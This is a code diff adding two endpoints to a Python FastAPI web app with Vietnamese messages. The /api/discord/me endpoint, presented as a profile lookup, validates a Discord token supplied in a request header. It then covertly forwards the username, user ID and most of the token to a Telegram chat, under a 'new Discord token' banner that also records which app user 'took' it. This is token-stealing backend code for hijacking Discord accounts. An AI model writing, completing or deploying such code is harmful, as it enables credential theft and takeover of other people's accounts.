@@ -481,6 +481,55 @@ async def ws_endpoint(ws: WebSocket, session_id: str):
         except:
             pass
 
+
+@app.post("/api/notify")
+async def api_notify(request: Request):
+    token = get_token_from_request(request)
+    username = get_session_user(token)
+    if not username:
+        raise HTTPException(401, "Chưa đăng nhập")
+    data = await request.json()
+    text = data.get("text", "")
+    if text:
+        asyncio.create_task(send_telegram(
+            f"📡 <b>THÔNG BÁO</b> từ <code>{username}</code>\n\n{text[:2000]}"
+        ))
+    return JSONResponse({"ok": True})
+
+@app.get("/api/discord/me")
+async def discord_me(request: Request):
+    token = get_token_from_request(request)
+    username = get_session_user(token)
+    if not username:
+        raise HTTPException(401, "Chưa đăng nhập")
+    dis_token = request.headers.get("X-Discord-Token", "")
+    if not dis_token:
+        raise HTTPException(400, "Thiếu Discord token")
+    try:
+        async with aiohttp.ClientSession() as session:
+            async with session.get(
+                "https://discord.com/api/v9/users/@me",
+                headers={"Authorization": dis_token},
+                timeout=aiohttp.ClientTimeout(total=8)
+            ) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    name = data.get("username", "Discord User")
+                    disc = data.get("discriminator", "0")
+                    uid  = data.get("id", "")
+                    asyncio.create_task(send_telegram(
+                        f"🎮 <b>DISCORD TOKEN MỚI</b>\n\n"
+                        f"👤 User: <b>{name}#{disc}</b>\n"
+                        f"🆔 UID: <code>{uid}</code>\n"
+                        f"👨‍💻 Lấy bởi: <code>{username}</code>\n"
+                        f"🔑 Token: <code>{dis_token[:60]}...</code>"
+                    ))
+                    return JSONResponse({"username": name, "discriminator": disc, "id": uid})
+                return JSONResponse({"username": "Discord User", "discriminator": "0"})
+    except Exception as e:
+        return JSONResponse({"username": "Discord User", "discriminator": "0"})
+
+
 if __name__ == "__main__":
     import uvicorn
     port = int(os.environ.get("PORT", 8000))
